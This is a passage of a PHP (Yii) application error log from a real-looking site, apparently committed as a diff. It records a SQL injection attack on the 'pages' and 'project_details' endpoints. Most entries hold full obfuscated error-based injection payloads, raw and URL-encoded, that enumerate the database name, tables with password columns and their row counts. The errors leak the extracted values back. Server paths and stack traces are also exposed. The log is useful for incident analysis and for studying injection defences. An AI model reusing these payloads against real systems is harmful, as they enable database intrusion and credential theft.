/**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:11 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!rdlpk_db1!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,d./**/sChEmA_NaMe,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2570617373776f726425 /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/04/30 13:17:15 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!forgot_password_requests!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,t./**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2570617373776f726425 /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:15 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!forgot_password_requests!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,t./**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2570617373776f726425 /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/04/30 13:17:16 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!73!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(*),0x217e21) /**/fRoM rdlpk_db1.forgot_password_requests)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:16 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!73!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(*),0x217e21) /**/fRoM rdlpk_db1.forgot_password_requests)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+rdlpk_db1.forgot_password_requests))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+rdlpk_db1.forgot_password_requests))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/04/30 13:17:17 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ua_activate_requests!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,t./**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2570617373776f726425 and not t./**/tAbLe_nAmE in(0x666f72676f745f70617373776f72645f7265717565737473) /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:17 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ua_activate_requests!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,t./**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2570617373776f726425 and not t./**/tAbLe_nAmE in(0x666f72676f745f70617373776f72645f7265717565737473) /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+and+not+t.%2f**%2ftAbLe_nAmE+in(0x666f72676f745f70617373776f72645f7265717565737473)+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+1,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+and+not+t.%2f**%2ftAbLe_nAmE+in(0x666f72676f745f70617373776f72645f7265717565737473)+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+1,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/04/30 13:17:19 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!166!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(*),0x217e21) /**/fRoM rdlpk_db1.ua_activate_requests)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:19 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!166!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(*),0x217e21) /**/fRoM rdlpk_db1.ua_activate_requests)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+rdlpk_db1.ua_activate_requests))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+rdlpk_db1.ua_activate_requests))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/05/01 09:44:04 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'A=0'' at line 1. The SQL statement executed was: SELECT * from projects WHERE id='1'A=0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 09:44:04 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'A=0'' at line 1. The SQL statement executed was: SELECT * from projects WHERE id='1'A=0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1'A=0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1'A=0
+---
+2019/05/01 10:46:56 [error] [exception.CException] exception 'CException' with message 'FormsController cannot find the requested view "index".' in /home/rdlpk/public_html/framework/web/CController.php:878
+Stack trace:
+#0 /home/rdlpk/public_html/framework/web/CController.php(782): CController->renderPartial('index', NULL, true)
+#1 /home/rdlpk/public_html/protected/controllers/FormsController.php(4892): CController->render('index')
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): FormsController->actionIndex()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('index')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('forms/index')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/forms/index
+---
+2019/05/01 11:37:59 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0=A'' at line 1. The SQL statement executed was: SELECT * from projects WHERE id=''0=A'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
